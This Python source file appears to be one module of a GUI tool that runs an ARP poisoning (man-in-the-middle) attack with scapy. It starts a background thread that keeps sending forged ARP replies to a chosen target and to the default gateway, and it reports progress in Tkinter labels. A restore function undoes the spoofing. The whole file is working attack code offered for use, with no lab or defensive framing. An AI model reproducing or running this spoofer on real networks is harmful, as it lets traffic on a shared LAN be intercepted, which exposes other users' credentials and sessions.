import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
import scapy.all as scapy
import time
import threading
import traceback

from tkinter import *

def startArp(targetIp, defaultGatewayIp, terminalContentFrame, errorOutputContentFrame, colorConfig = "#252525") :

    global arpIsrunning, arpThreads, terminalLabel, errorOutputLabel

    arpIsrunning = False
    arpThreads = threading.Thread(target = lambda : arpLoop(targetIp, defaultGatewayIp))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    errorOutputLabel.configure(bg = colorConfig)
    
    terminalLabel["text"] += "$ Target IP = " + targetIp + "\n"
    terminalLabel["text"] += "$ Default Gateway IP = " + defaultGatewayIp + "\n"
    terminalLabel["text"] += "$ Running Arp Poisoning Attack...\n"

    runArpAttack(targetIp, defaultGatewayIp)
    
    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopArp(targetIp, defaultGatewayIp) :
    global arpThreads, arpIsrunning

    try:
        terminalLabel["text"] += "$ Stopping Arp Poisoning Attack...\n"
        terminalLabel["text"] += "$ Restoring default ARP values...\n"
        arpIsrunning = False
        arpThreads.join(0)
        arpThreads = None
        restore(defaultGatewayIp, targetIp)
        restore(targetIp, defaultGatewayIp)
        terminalLabel["text"] += "$ ARP Poisoning Attack successfully stopped!\n"
    except Exception as e:
        errorOutputLabel["text"] += "ERROR STOP : \n" + str(e) + "\n"

def runArpAttack(targetIp, defaultGatewayIp):
    global arpThreads, arpIsrunning
    arpIsrunning = True
    arpThreads.start()

def arpLoop(targetIp, defaultGatewayIp):
    try :
        while arpIsrunning == True:
            spoof(targetIp, defaultGatewayIp)
            spoof(defaultGatewayIp, targetIp)
            time.sleep(2)
    except Exception as e:
        errorOutputLabel["text"] += "ERROR ARP LOOP: \n" + str(e) + "\n"

def get_mac(targetIp):
    try :
        arp_request = scapy.ARP(pdst = targetIp)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

        return answered_list[0][1].hwsrc
    except Exception as e:
        errorOutputLabel["text"] += "ERROR GET_MAC: \n" + str(e) + "\n"

def spoof(targetIp, defaultGatewayIp):
    try :
        packet = scapy.ARP(op = 2, pdst = targetIp, 
                        hwdst = get_mac(targetIp), 
                                psrc = defaultGatewayIp)
    
        scapy.send(packet, verbose = False)
    except Exception as e:
        errorOutputLabel["text"] += "ERROR SPOOF : \n" + str(e) + "\n"


def restore(destination_ip, source_ip):
    try :
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip, 
                                hwdst = destination_mac, 
                    psrc = source_ip, hwsrc = source_mac)
    
        scapy.send(packet, verbose = False)
    except Exception as e:
        errorOutputLabel["text"] += "ERROR RESTORE : \n" + str(e) + "\n"
